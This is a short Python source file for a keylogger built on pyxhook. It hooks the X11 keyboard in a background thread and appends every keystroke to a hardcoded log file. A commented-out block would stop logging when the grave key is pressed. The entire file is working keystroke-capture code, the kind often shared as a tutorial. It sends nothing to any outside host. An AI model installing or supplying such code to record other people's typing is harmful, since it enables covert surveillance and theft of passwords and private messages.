
import pyxhook
from threading import Thread
#change this to your log file's path
log_file='/home/alessandro/Desktop/file.log'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob=open(log_file,'a')
  
  if event.Key=="Return":
  	fob.write('\n')
  elif event.Key=="space":
  	fob.write(' ')
  else:
  	fob.write(event.Key)
#add event for return and space
#  if event.Ascii==96: #96 is the ascii value of the grave key (`)
#    fob.close()
#    new_hook.cancel()

def hook_thread():
	#instantiate HookManager class
	new_hook=pyxhook.HookManager()
	#listen to all keystrokes
	new_hook.KeyDown=OnKeyPress
	#hook the keyboard
	new_hook.HookKeyboard()
	#start the session
	new_hook.start()

if __name__ == "__main__":
	thread = Thread(target = hook_thread)
	thread.start()
    #thread.join()
